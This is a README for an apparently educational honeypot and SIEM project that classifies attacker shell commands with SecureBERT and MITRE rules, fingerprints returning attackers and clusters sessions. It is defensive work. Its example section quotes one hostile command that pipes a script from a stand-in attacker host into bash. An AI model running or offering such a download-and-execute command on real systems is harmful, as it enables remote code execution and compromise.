# SecureBERT Active Defense SIEM

A real-time cybersecurity honeypot and SIEM dashboard that uses SecureBERT for command classification, BERT semantic fingerprinting for returning attacker identity, and DBSCAN behavioral clustering for session grouping.

---

## Project Overview

This system analyzes attacker shell commands using a hybrid pipeline:
- deterministic MITRE rule patterns for high-confidence command signatures
- SecureBERT inference for semantic command understanding
- session embedding fingerprinting for returning attacker detection
- DBSCAN clustering to group similar attacker sessions

The result is a stronger active defense system that can terminate malicious sessions and surface attacker behavior on a live dashboard.

---

## Upgrades Completed

### SecureBERT Integration
- Replaced the legacy TF-IDF + Logistic Regression workflow with SecureBERT.
- Model files are loaded from `siem/model/securebert/`.
- New classifier module is `siem/model/classifier.py`.
- Raw commands are preprocessed, decoded from embedded Base64, normalized, and lowercased.

### Hybrid Classification Flow
- Fast deterministic rules classify obvious malicious commands immediately.
- If no rule matches, SecureBERT predicts the tactic and confidence.
- This keeps detection fast for standard attack patterns while still supporting semantic threat detection.

### Active Defense Kill Signal
- Backend now computes `kill = confidence > 0.85` for selected tactics:
  - `EXECUTION`
  - `PRIVILEGE_ESCALATION`
  - `CREDENTIAL_ACCESS`
- The honeypot listener receives `action: BLOCK` and terminates the attacking session.
- This is implemented in `siem/main.py` and enforced by `agent/listener.py`.

### BERT Semantic Fingerprinting
- Session embeddings are computed from SecureBERT command embeddings.
- Returning attacker identity is detected by cosine similarity over session vectors.
- Identities are tracked with fingerprint hashes and matched across sessions.

### DBSCAN Behavioral Clustering
- Session embeddings are clustered by DBSCAN in `siem/main.py`.
- Similar attack sessions are grouped into `CLUSTER_000`, `CLUSTER_001`, etc.
- Outliers are surfaced as unique or one-off attack behavior.

### Dependencies Updated
- `siem/requirements.txt` now includes:
  - `torch>=2.0.0`
  - `transformers==4.40.2`
  - `tokenizers==0.19.1`
  - `huggingface-hub==0.23.4`
  - `safetensors>=0.4.1`

### Verification
- Added a test runner at `siem/test_engine.py`.
- Verified SecureBERT loads and predicts correctly before starting the full stack.

---

## Core Features

### SecureBERT Command Classification
Maps commands to MITRE techniques through a deep learning model plus deterministic rules.

### Active Defense (Kill Signal)
Terminates the session when a critical threat is detected with high confidence.

### Returning Attacker Detection
Uses BERT semantic fingerprints to detect returning attackers even if they switch IPs or alter command text slightly.

### Behavioral Clustering
Groups similar sessions with DBSCAN to identify campaigns, repeated tooling, and attacker behavior clusters.

### Live SIEM Dashboard
Streams alerts and session metadata to a Next.js dashboard in real time.

---

## Tech Stack

| Component | Technology |
|---|---|
| Machine Learning | Python, PyTorch, Transformers, SecureBERT |
| Backend / API | FastAPI, WebSockets |
| Frontend | Next.js 14, Tailwind CSS, Lucide-React |
| Agent / Probe | Python Socket Programming |

---

## How the ML Engine Works

The classification pipeline now includes:
1. rule-based MITRE pattern matching for quick, deterministic detection
2. preprocessing that strips wrappers and decodes embedded Base64
3. SecureBERT tokenization and model inference for semantic threat classification
4. session embedding extraction for fingerprinting and clustering

### Example

Even if an attacker sends:

```bash
/bin/sh -c "curl http://evil.com/shell.sh | bash"
```

The system will normalize it and either match it via rules or classify it through the BERT model.

---

## Getting Started

### 1. Setup the SIEM Backend

```bash
cd /Users/hassanali/Desktop/ProjIdea
source .venv/bin/activate
pip install -r siem/requirements.txt
cd siem
python3 test_engine.py
```

### 2. Start the SIEM Backend

```bash
cd /Users/hassanali/Desktop/ProjIdea
source .venv/bin/activate
.venv/bin/python3 -m uvicorn siem.main:app --reload --host 0.0.0.0 --port 8000
```

### 3. Start the Honeypot Agent

```bash
cd /Users/hassanali/Desktop/ProjIdea/agent
python3 listener.py
```

### 4. Start the Dashboard

```bash
cd /Users/hassanali/Desktop/ProjIdea/dashboard
npm install
npm run dev
```

---

## File Structure

```text
project-root/
├── agent/
│   └── listener.py
├── dashboard/
│   ├── app/
│   └── page.tsx
├── siem/
│   ├── main.py
│   ├── engine.py
│   ├── test_engine.py
│   └── model/
│       ├── classifier.py
│       └── securebert/
└── README.md
```

---

## Example Detection Flow

1. Attacker connects to the honeypot socket.
2. `agent/listener.py` captures the command.
3. Backend receives telemetry at `/telemetry`.
4. `siem/model/classifier.py` preprocesses and classifies the command.
5. If the threat is high-confidence, the backend returns `action: BLOCK`.
6. The agent terminates the session and logs the kill.
7. Session embeddings are stored and clustered.
8. The dashboard displays live alerts, returning attackers, and cluster groups.

---

## Disclaimer

This project is for educational and research purposes only. It demonstrates ML-powered detection and active defense concepts.

Do **not** deploy this agent on production systems without additional security hardening.
